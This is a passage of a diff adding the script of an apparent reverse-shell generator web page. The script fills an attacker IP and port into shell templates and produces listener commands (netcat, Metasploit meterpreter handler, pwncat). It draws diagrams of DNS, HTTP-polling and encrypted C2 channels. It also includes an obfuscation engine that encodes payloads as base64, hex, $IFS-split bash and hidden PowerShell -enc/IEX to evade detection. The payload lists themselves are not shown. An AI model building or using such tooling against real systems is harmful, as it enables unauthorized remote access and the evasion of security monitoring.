+      const r2 = aline(DNX+42,38, 363,38, '#00aa33', `url(#rg${id})`, '', 0.8, '4,4');
+      const p1 = packet(363,24, DNX+42,24, '#66ff88', '0s',   '1.5s');
+      const p2 = packet(DNX-42,24, 93,24,  '#66ff88', '0.3s', '1.5s');
+      const p3 = packet(93,38,  DNX-42,38, '#44cc66', '0.7s', '2.0s');
+      const p4 = packet(DNX+42,38, 363,38, '#44cc66', '1.0s', '2.0s');
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${dnsBox}${v2d}${d2a}${r1}${r2}${p1}${p2}${p3}${p4}
+        ${t(155,18,'① query (XSalsa20)','#44cc66',7)}
+        ${t(310,18,'NS forward','#44cc66',7)}
+        ${t(155,50,'② response (cmd)','#33aa55',7)}
+        ${t(310,50,'NS reply','#33aa55',7)}
+        ${t(230,112,'only UDP/TCP 53 needed — bypasses most firewalls','#333',7)}
+      </svg>`;
+    }
+
+    // ── HTTP POLLING (HoaxShell) ────────────────────────────────────────────
+    case 'http': {
+      const D = `<defs>
+        ${mkr(`ro${id}`, '#e0c030', false)}
+        ${mkr(`lo${id}`, '#e0c030', true)}
+        ${mkr(`lr${id}`, '#ff6622', true)}
+      </defs>`;
+      const atk = laptop(ACX, '#e0c030', '#120e00', 'ATTACKER', `HTTP :${port}`);
+      const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', 'polling');
+      const g1 = aline(RV,24, LA,24, '#e0c030', `url(#lo${id})`, '', 1.1);
+      const g2 = aline(LA,38, RV,38, '#e0c030', `url(#ro${id})`, '', 0.9, '6,4');
+      const g3 = aline(RV,52, LA,52, '#ff6622', '', `url(#lr${id})`, 1.0);
+      const p1 = packet(RV,24, LA,24, '#ffe060', '0s',   '1.7s');
+      const p2 = packet(LA,38, RV,38, '#ffe060', '0.6s', '2.0s');
+      const p3 = packet(RV,52, LA,52, '#ff9955', '1.0s', '1.9s');
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${g1}${g2}${g3}${p1}${p2}${p3}
+        ${label(243,20,'① GET /token','victim polls for cmd','#d0b020','#806800')}
+        ${label(243,35,'② HTTP 200','encoded cmd payload','#d0b020','#806800')}
+        ${label(243,54,'③ POST /token','encoded output','#ff8840','#804420')}
+        ${t(230,112,'Authorization header = C2 token — blends with HTTPS','#333',7)}
+      </svg>`;
+    }
+
+    // ── ENCRYPTED REVERSE ──────────────────────────────────────────────────
+    case 'enc_reverse': {
+      const D = `<defs>
+        ${mkr(`ro${id}`, '#e0c030', false)}
+        ${mkr(`lo${id}`, '#e0c030', true)}
+      </defs>`;
+      const atk = laptop(ACX, '#e0c030', '#120e00', 'ATTACKER', `:${port} LISTEN`);
+      const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', ':random');
+      // TLS handshake — solid pulsing gold
+      const h1 = solidLine(RV,22, LA,22, '#e0c030', `url(#lo${id})`);
+      // encrypted channels — thick animated
+      const e1 = aline(LA,36, RV,36, '#e0c030', `url(#ro${id})`, '', 1.4, '10,4');
+      const e2 = aline(RV,50, LA,50, '#e0c030', `url(#lo${id})`, '', 1.1, '10,4');
+      // lock shapes
+      const lock = (x,y) =>
+        `<rect x="${x-5}" y="${y}" width="10" height="8" rx="1.5" fill="#c0a020">` +
+          `<animate attributeName="fill-opacity" values="1;0.5;1" dur="2s" repeatCount="indefinite"/>` +
+        `</rect>` +
+        `<path d="M${x-3},${y} Q${x-3},${y-4} ${x},${y-4} Q${x+3},${y-4} ${x+3},${y}" stroke="#c0a020" stroke-width="1.5" fill="none"/>` +
+        `<circle cx="${x}" cy="${y+4}" r="1.5" fill="#030a03"/>`;
+      const p1 = packet(RV,22, LA,22, '#ffe080', '0s',   '1.6s');
+      const p2 = packet(LA,36, RV,36, '#e0c030', '0.3s', '1.8s');
+      const p3 = packet(RV,50, LA,50, '#e0c030', '0.7s', '2.0s');
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${h1}${e1}${e2}
+        ${lock(172,38)}${lock(230,38)}${lock(288,38)}
+        ${p1}${p2}${p3}
+        ${label(243,18,'① TLS/SSL handshake','victim → attacker','#d0b020','#806800')}
+        ${label(243,33,'② encrypted cmd','attacker → victim','#d0b020','#806800')}
+        ${label(243,52,'③ encrypted output','victim → attacker','#d0b020','#806800')}
+        ${t(230,112,'AES/TLS — indistinguishable from HTTPS to IDS/IPS','#333',7)}
+      </svg>`;
+    }
+
+    default: return '';
+  }
+}
+
+function getDiagType(item) {
+  const n = item.name.toLowerCase();
+  const m = item.meta || [];
+  if (m.includes('bind')) return 'bind';
+  if (n.includes('dns') || n.includes('chashell')) return 'dns';
+  if (n.includes('hoaxshell')) return 'http';
+  if (item.encrypted) return 'enc_reverse';
+  return 'reverse';
+}
+
+// ── UTILITIES ────────────────────────────────────────────────────────────────
+
+function getIP()   { return document.getElementById('ip').value.trim()   || '10.10.10.10'; }
+function getPort() { return document.getElementById('port').value.trim() || '4444'; }
+function getShell(){ return document.getElementById('shell').value; }
+
+function fill(cmd) {
+  return cmd
+    .replace(/\{ip\}/g, getIP())
+    .replace(/\{port\}/g, getPort())
+    .replace(/\{shell\}/g, getShell());
+}
+
+function copyText(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+    showToast();
+  });
+}
+
+let toastTimer;
+function showToast() {
+  const t = document.getElementById('toast');
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 1400);
+}
+
+// ── LISTENER ─────────────────────────────────────────────────────────────────
+
+function updateListener() {
+  const ip = getIP(), port = getPort();
+  const type = document.getElementById('listener').value;
+  const cmds = {
+    nc:        `nc -lvnp ${port}`,
+    ncat:      `ncat -lvnp ${port}`,
+    socat:     `socat -d -d file:\`tty\`,raw,echo=0 TCP-LISTEN:${port}`,
+    rlwrap:    `rlwrap nc -lvnp ${port}`,
+    msf:       `use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST ${ip}\nset LPORT ${port}\nrun`,
+    pwncat_cs: `pwncat-cs -lp ${port}`,
+    pwncat_cy: `pwncat -l -p ${port}`,
+  };
+  document.getElementById('listener-cmd').textContent = cmds[type] || cmds.nc;
+}
+
+// ── RENDER ───────────────────────────────────────────────────────────────────
+
+function buildBadges(meta, encrypted) {
+  const map = {
+    linux:'badge-linux', mac:'badge-mac', windows:'badge-windows',
+    bind:'badge-bind', staged:'badge-msfvenom', stageless:'badge-msfvenom',
+    android:'badge-bind', ios:'badge-bind'
+  };
+  let html = meta.filter(m => map[m]).map(m =>
+    `<span class="badge ${map[m]}">${m}</span>`
+  ).join('');
+  if (encrypted) html += `<span class="badge badge-encrypted" title="Encrypted transport">&#128274; enc</span>`;
+  return html;
+}
+
+function buildSetupGuide(setup) {
+  if (!setup || !setup.length) return '';
+  const steps = setup.map((s, i) => `
+    <div class="setup-step">
+      <span class="setup-step-num">[${i+1}]</span>
+      <div class="setup-step-inner">
+        <div class="setup-step-title">${s.title}</div>
+        <div class="setup-cmd">
+          <pre><code>${highlight(s.cmd)}</code></pre>
+          <button class="copy-btn" style="margin:3px 0 0 8px;align-self:flex-start" onclick="copyText(this.previousElementSibling.querySelector('code').textContent,this)">copy</button>
+        </div>
+      </div>
+    </div>`).join('');
+  return `<div class="setup-guide">
+    <div class="setup-label"><span>&#9658; SETUP REQUIRED</span> — step-by-step:</div>
+    ${steps}
+  </div>`;
+}
+
+function getActiveFilters() {
+  return [...document.querySelectorAll('.filter-chip[class*="active-"]')]
+    .map(c => c.dataset.filter);
+}
+
+function toggleFilter(btn) {
+  const f = btn.dataset.filter;
+  const cls = `active-${f}`;
+  if (btn.classList.contains(cls)) {
+    btn.classList.remove(cls);
+  } else {
+    btn.classList.add(cls);
+  }
+  render();
+}
+
+function buildList(data, containerId, countId) {
+  const search  = document.getElementById('search').value.toLowerCase();
+  const filters = getActiveFilters();
+  const container = document.getElementById(containerId);
+  const count = document.getElementById(countId);
+
+  const filtered = data.filter(item => {
+    if (search && !item.name.toLowerCase().includes(search)
+        && !item.meta.some(m => m.includes(search))
+        && !item.cmd.toLowerCase().includes(search)) return false;
+    for (const f of filters) {
+      if (f === 'enc' && !item.encrypted) return false;
+      if (f === 'obf' && !canObfuscate(item.cmd)) return false;
+      if (f !== 'enc' && f !== 'obf' && !item.meta.includes(f)) return false;
+    }
+    return true;
+  });
+
+  count.textContent = filtered.length;
+
+  if (filtered.length === 0) {
+    container.innerHTML = '<div class="no-results">no results for "' + search + '"</div>';
+    return;
+  }
+
+  container.innerHTML = filtered.map((item, i) => {
+    const id = `${containerId}-${i}`;
+    const cmd = fill(item.cmd);
+    const setupHtml = buildSetupGuide(item.setup);
+    const needsSetup = item.setup && item.setup.length > 0;
+    const setupBadge = needsSetup ? '<span class="badge badge-tool" style="font-size:0.65em">setup</span>' : '';
+    const encClass = item.encrypted ? ' encrypted' : '';
+    const canObf = canObfuscate(item.cmd);
+    const obfBtn = canObf
+      ? `<button class="obf-btn" id="${id}-obf" onclick="event.stopPropagation();cycleObf('${id}',this)" data-cmd="${escapeAttr(cmd)}" data-meta="${(item.meta||[]).join(',')}" data-mode="0" title="Cycle obfuscation mode">&#9654; obf</button>`
+      : '';
+    return `
+      <div class="shell-item${encClass}">
+        <div class="shell-header" onclick="toggle('${id}')">
+          <span class="shell-name">${item.name}</span>
+          <span class="shell-badges">${buildBadges(item.meta, item.encrypted)}${setupBadge}</span>
+          ${obfBtn}
+          <button class="copy-btn" onclick="event.stopPropagation();copyText(document.getElementById('${id}-code').textContent, this)">copy</button>
+        </div>
+        <div class="shell-body" id="${id}">
+          <div class="obf-mode-bar" id="${id}-modebar" style="display:none"></div>
+          <pre><code id="${id}-code">${highlight(cmd)}</code></pre>
+          <div class="shell-diagram" data-dtype="${getDiagType(item)}" data-dport="${getPort()}"></div>
+          ${setupHtml}
+        </div>
+      </div>`;
+  }).join('');
+}
+
+function buildTools() {
+  const ip = getIP(), port = getPort();
+  const badgeMap = {
+    tool:'badge-tool', linux:'badge-linux', mac:'badge-mac', windows:'badge-windows',
+    dns:'badge-dns', ssl:'badge-ssl', smb:'badge-smb'
+  };
+  const mkBadge = b => badgeMap[b] ? `<span class="badge ${badgeMap[b]}">${b}</span>` : '';
+
+  document.getElementById('list-tools').innerHTML = TOOLS.map((t, i) => {
+    const id = `tool-${i}`;
+    const setupHtml = (t.setup||[]).map((s,j) => `
+      <div class="setup-step">
+        <span class="setup-step-num">[${j+1}]</span>
+        <div class="setup-step-inner">
+          <div class="setup-step-title">${s.title}</div>
+          <div class="setup-cmd" style="display:flex;gap:8px;align-items:flex-start">
+            <pre style="flex:1;background:#020702;border:1px solid #0a1e0a;border-radius:3px;padding:6px 8px;margin:0"><code style="font-size:0.82em">${highlight(s.cmd.replace(/{ip}/g,ip).replace(/{port}/g,port))}</code></pre>
+            <button class="copy-btn" style="margin-top:3px;white-space:nowrap" onclick="copyText(this.previousElementSibling.querySelector('code').textContent,this)">copy</button>
+          </div>
+        </div>
+      </div>`).join('');
+
+    const usageHtml = (t.usage||[]).map(u => {
+      const cmd = u.cmd.replace(/{ip}/g,ip).replace(/{port}/g,port).replace(/{port2}/g, String(parseInt(port)+1));
+      return `<div class="tool-cmd">
+        <code>${escapeHtml(cmd)}</code>
+        <button class="copy-btn" onclick="copyText(this.previousElementSibling.textContent,this)">copy</button>
+      </div>
+      <div style="color:#444;font-size:0.72em;margin:-2px 0 6px 2px">${u.label}</div>`;
+    }).join('');
+
+    const noteHtml = t.note ? `<div style="color:#555;font-size:0.75em;border-top:1px solid #0d2a0d;padding-top:8px;margin-top:8px">${t.note}</div>` : '';
+
+    return `<div class="tool-card">
+      <div class="tool-card-header" onclick="toggle('${id}')">
+        <span class="tool-name">${t.name}</span>
+        <span class="tool-desc">${t.desc}</span>
+        <span class="shell-badges">${(t.badges||[]).map(mkBadge).join('')}</span>
+      </div>
+      <div class="tool-body" id="${id}">
+        ${setupHtml ? `<div class="setup-guide" style="margin-bottom:10px"><div class="setup-label"><span>&#9658; INSTALL</span></div>${setupHtml}</div>` : ''}
+        ${usageHtml ? `<div class="tool-section-title">&#9658; USAGE</div>${usageHtml}` : ''}
+        ${noteHtml}
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function toggle(id) {
+  const el = document.getElementById(id);
+  el.classList.toggle('open');
+  if (el.classList.contains('open')) {
+    const diag = el.querySelector('.shell-diagram');
+    if (diag && !diag.querySelector('svg')) {
+      diag.innerHTML = getDiagram(diag.dataset.dtype, diag.dataset.dport);
+    }
+  }
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function escapeAttr(s) {
+  return s.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── OBFUSCATION ENGINE ───────────────────────────────────────────────────────
+
+function canObfuscate(cmd) {
+  return /bash|zsh|\bsh\b|python|perl|php|ruby|powershell|pwsh/.test(cmd.toLowerCase());
+}
+
+// Detect which obf modes are available for this command
+function obfModes(cmd, meta) {
+  const cl = cmd.toLowerCase();
+  const isPS  = /powershell|pwsh/.test(cl);
+  const isBash = /bash|zsh|\bsh\b/.test(cl);
+  const isPy  = /python/.test(cl);
+  const isPerl = /\bperl\b/.test(cl);
+  const isPHP  = /\bphp\b/.test(cl);
+  const isRuby = /\bruby\b/.test(cl);
+
+  const modes = [{ key:'plain', label:'plain' }];
+  if (isBash || (!isPS && !isPy && !isPerl && !isPHP && !isRuby))
+    modes.push({ key:'b64bash',  label:'base64' });
+  if (isBash)
+    modes.push({ key:'varsplit', label:'$var split' });
+  if (isBash)
+    modes.push({ key:'hexprintf',label:'hex printf' });
+  if (isPS)
+    modes.push({ key:'psenc',    label:'-EncodedCmd' });
+  if (isPS)
+    modes.push({ key:'pschararr',label:'char[]' });
+  if (isPy)
+    modes.push({ key:'pyb64',    label:'py b64exec' });
+  if (isPerl)
+    modes.push({ key:'perlhex',  label:'perl hex' });
+  if (isPHP)
+    modes.push({ key:'phpb64',   label:'php b64' });
+  if (isRuby)
+    modes.push({ key:'rubyb64',  label:'ruby b64' });
+  // Universal bash wrapper for non-bash interpreters too
+  if (!isBash && (isPy || isPerl || isPHP || isRuby))
+    modes.push({ key:'b64bash', label:'bash b64 wrap' });
+  return modes;
+}
+
+function applyObf(cmd, modeKey) {
+  if (modeKey === 'plain') return cmd;
+
+  const b64 = (s) => {
+    try { return btoa(unescape(encodeURIComponent(s))); }
+    catch(e) { return btoa(s); }
+  };
+
+  switch (modeKey) {
+
+    case 'b64bash': {
+      const enc = b64(cmd);
+      return `bash -c "$(echo '${enc}'|base64 -d)"`;
+    }
+
+    case 'varsplit': {
+      // Split key interpreter names into vars + $IFS for spaces
+      let obf = cmd;
+      const subs = {
+        'bash': ["b='ba'","s='sh'"], 'python3': ["p='py'","t='thon3'"],
+        'python': ["p='py'","t='thon'"], 'perl': ["pe='pe'","rl='rl'"],
+        'ruby': ["r='ru'","b2='by'"], 'php': ["p='p'","h='hp'"],
+      };
+      let prefix = '';
+      for (const [word, [a, b2]] of Object.entries(subs)) {
+        const re = new RegExp(`\\b${word}\\b`);
+        if (re.test(obf)) {
+          const va = a.split('=')[0].replace("'",'');
+          const vb = b2.split('=')[0].replace("'",'');
+          prefix += `${a};${b2}; `;
+          obf = obf.replace(re, `$${va}$${vb}`);
+        }
+      }
+      // Replace spaces in core part with ${IFS}
+      obf = obf.replace(/ /g, '${IFS}');
+      return `${prefix}eval ${obf}`;
+    }
+
+    case 'hexprintf': {
+      const hexCmd = Array.from(cmd)
+        .map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0'))
+        .join('');
+      return `eval "$(printf '${hexCmd}')"`;
+    }
+
+    case 'psenc': {
+      // UTF-16LE base64 for -EncodedCommand
+      let utf16 = '';
+      for (let i = 0; i < cmd.length; i++) {
+        utf16 += String.fromCharCode(cmd.charCodeAt(i) & 0xff, (cmd.charCodeAt(i) >> 8) & 0xff);
+      }
+      const enc = btoa(utf16);
+      return `powershell -nop -w hidden -enc ${enc}`;
+    }
+
+    case 'pschararr': {
+      // [char[]](72,101,...) -join ''  approach — wrap in IEX
+      const arr = Array.from(cmd).map(c => c.charCodeAt(0)).join(',');
+      return `powershell -nop -c "IEX([char[]](${arr})-join'')"`;
+    }
+
+    case 'pyb64': {
+      const match = cmd.match(/python3?\s+-c\s+['"](.+)['"]/s);
+      if (match) {
+        const code = match[1];
+        const enc = b64(code);
+        const py = cmd.startsWith('python3') ? 'python3' : 'python';
+        return `${py} -c "exec(__import__('base64').b64decode(b'${enc}').decode())"`;
+      }
+      return `bash -c "$(echo '${b64(cmd)}'|base64 -d)"`;
+    }
+
+    case 'perlhex': {
+      const hex = Array.from(cmd).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+      return `perl -e "eval(pack('H*','${hex}'))"`;
+    }
+
+    case 'phpb64': {
+      const match = cmd.match(/php\s+-r\s+['"](.+)['"]/s);
+      const code = match ? match[1] : cmd;
+      return `php -r "eval(base64_decode('${b64(code)}'));"`;
+    }
+
+    case 'rubyb64': {
+      const match = cmd.match(/ruby\s+-e\s+['"](.+)['"]/s);
+      const code = match ? match[1] : cmd;
+      return `ruby -e "require 'base64';eval(Base64.decode64('${b64(code)}'))"`;
+    }
+
+    default: return cmd;
+  }
+}
+
+// Cycle through available obfuscation modes on each click
+function cycleObf(id, btn) {
+  const cmd  = btn.dataset.cmd;
+  const meta = (btn.dataset.meta || '').split(',');
+  const modes = obfModes(cmd, meta);
+  let modeIdx = parseInt(btn.dataset.mode || '0');
+  modeIdx = (modeIdx + 1) % modes.length;
+  btn.dataset.mode = modeIdx;
+
+  const modeKey = modes[modeIdx].key;
+  const obfCmd  = applyObf(cmd, modeKey);
+
+  // Update code display
+  document.getElementById(id + '-code').innerHTML = highlight(obfCmd);
+
+  // Update button state
+  const isPlain = modeKey === 'plain';
+  btn.classList.toggle('obf-on', !isPlain);
+  btn.textContent = isPlain ? '▶ obf' : `◈ ${modes[modeIdx].label}`;
+
+  // Render mode-bar chips inside body
+  const bar = document.getElementById(id + '-modebar');
+  if (bar) {
+    bar.style.display = 'flex';
+    bar.innerHTML = modes.map((m, idx) =>
+      `<span class="obf-mode-chip${idx === modeIdx ? ' active' : ''}"
+        onclick="jumpObf('${id}',${idx})">${m.label}</span>`
+    ).join('');
+  }
+
+  // Auto-open body if not open
+  const body = document.getElementById(id);
+  if (body && !body.classList.contains('open')) body.classList.add('open');
+}
+
+// Tokenizer-based highlighter: works on raw text, never on HTML
+// Jump directly to a specific obf mode from a chip click
+function jumpObf(id, modeIdx) {
+  const btn = document.getElementById(id + '-obf');
+  if (!btn) return;
+  const cmd   = btn.dataset.cmd;
+  const meta  = (btn.dataset.meta || '').split(',');
+  const modes = obfModes(cmd, meta);
+  modeIdx = Math.max(0, Math.min(modeIdx, modes.length - 1));
+  btn.dataset.mode = modeIdx;
+
+  const modeKey = modes[modeIdx].key;
+  document.getElementById(id + '-code').innerHTML = highlight(applyObf(cmd, modeKey));
+
+  const isPlain = modeKey === 'plain';
+  btn.classList.toggle('obf-on', !isPlain);
+  btn.textContent = isPlain ? '▶ obf' : `◈ ${modes[modeIdx].label}`;
+
+  const bar = document.getElementById(id + '-modebar');
+  if (bar) {
+    bar.querySelectorAll('.obf-mode-chip').forEach((c, i) =>
+      c.classList.toggle('active', i === modeIdx));
+  }
+}
+
+function highlight(raw) {
+  return raw.split('\n').map(hlLine).join('\n');
+}
+
+function hlLine(line) {
+  // Token rules: [regex, className]  — order = priority (first match wins)
+  const rules = [
+    [/^(#.*)$/,                                                             'sh-comment'],
+    [/^("(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*')/,                             'sh-string'],
+    [/^(\$\{[^}]*\}|\$\([^)]*\)|\$[A-Za-z_]\w*)/,                         'sh-var'],
+    [/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/,                             'sh-ip'],
+    [/^(--?[a-zA-Z][a-zA-Z0-9_-]*)(?=\s|$|;|&|\||>|\/)/,                  'sh-flag'],
+    [/^(bash|zsh|sh|dash|python3?|perl|ruby|php|node|powershell(?:\.exe)?|pwsh|cmd(?:\.exe)?|ncat|nc|socat|curl|wget|openssl|msfvenom|msfconsole|rlwrap|pwncat(?:-cs)?|export|set|use|run|exec|eval)(?=\s|$|;|&|\||>|\/)/,'sh-cmd'],
+    [/^(\/[a-zA-Z0-9_./-]+)/,                                              'sh-path'],
+    [/^(\d+)/,                                                              'sh-num'],
+    [/^(&&|\|\||[|;&><])/,                                                  'sh-op'],
+  ];
+
+  let out = '';
+  let i = 0;
+  while (i < line.length) {
+    let matched = false;
+    for (const [re, cls] of rules) {
+      const m = line.slice(i).match(re);
+      if (m) {
+        out += `<span class="${cls}">${escapeHtml(m[1])}</span>`;
+        i += m[1].length;
+        matched = true;
+        break;
+      }
+    }
+    if (!matched) {
+      out += escapeHtml(line[i]);
+      i++;
+    }
+  }
+  return out;
+}
+
+function render() {
+  updateListener();
+  buildList(REVERSE,  'list-reverse',  'count-reverse');
+  buildList(BIND,     'list-bind',     'count-bind');
+  buildList(MSFVENOM, 'list-msfvenom', 'count-msfvenom');
+  buildTools();
+  buildLotl();
+}
+
+// ── LOTL ─────────────────────────────────────────────────────────────────────
+
+let _lotlOS = 'all';
+
+function switchLotlOS(btn) {
+  _lotlOS = btn.dataset.os;
+  document.querySelectorAll('.lotl-os-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  buildLotl();
+}
+
+function buildLotl() {
+  const ip = getIP(), port = getPort();
+  const osLabels = { windows: 'Windows', linux: 'Linux', mac: 'macOS' };
+  const sections = LOTL.filter(s => _lotlOS === 'all' || s.os === _lotlOS);
+
+  document.getElementById('list-lotl').innerHTML = sections.map((sec, si) => {
+    const rows = sec.items.map((item, ii) => {
+      const id = `lotl-${si}-${ii}`;
+      const cmd = item.cmd.replace(/{ip}/g, ip).replace(/{port}/g, port);
+      return `
+        <div class="lotl-item">
+          <div class="lotl-item-header" onclick="toggleLotl('${id}')">
+            <span class="lotl-item-label">${item.label}</span>
+            <button class="copy-btn" onclick="event.stopPropagation();copyText(document.getElementById('${id}-code').textContent,this)">copy</button>
+          </div>
+          <div class="lotl-item-body" id="${id}">
+            <pre><code id="${id}-code">${highlight(cmd)}</code></pre>
+          </div>
+        </div>`;
+    }).join('');
+
+    const showOsBadge = _lotlOS === 'all';
+    const osBadge = showOsBadge
+      ? `<span class="lotl-os-badge ${sec.os}">${osLabels[sec.os] || sec.os}</span>` : '';
+
+    return `
+      <div class="lotl-section">
+        <div class="lotl-section-header">
+          ${osBadge}
+          <span class="lotl-section-title">${sec.title}</span>
+        </div>
+        ${rows}
+        ${sec.note ? `<div class="lotl-note">${sec.note}</div>` : ''}
+      </div>`;
+  }).join('');
+}
+
+function toggleLotl(id) {
+  document.getElementById(id)?.classList.toggle('open');
+}
+
+// ── TABS ─────────────────────────────────────────────────────────────────────
+
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('tab-' + name).classList.add('active');
+}
+
+// ── INIT ─────────────────────────────────────────────────────────────────────
+window.onload = render;
+</script>
+</body>
+</html>
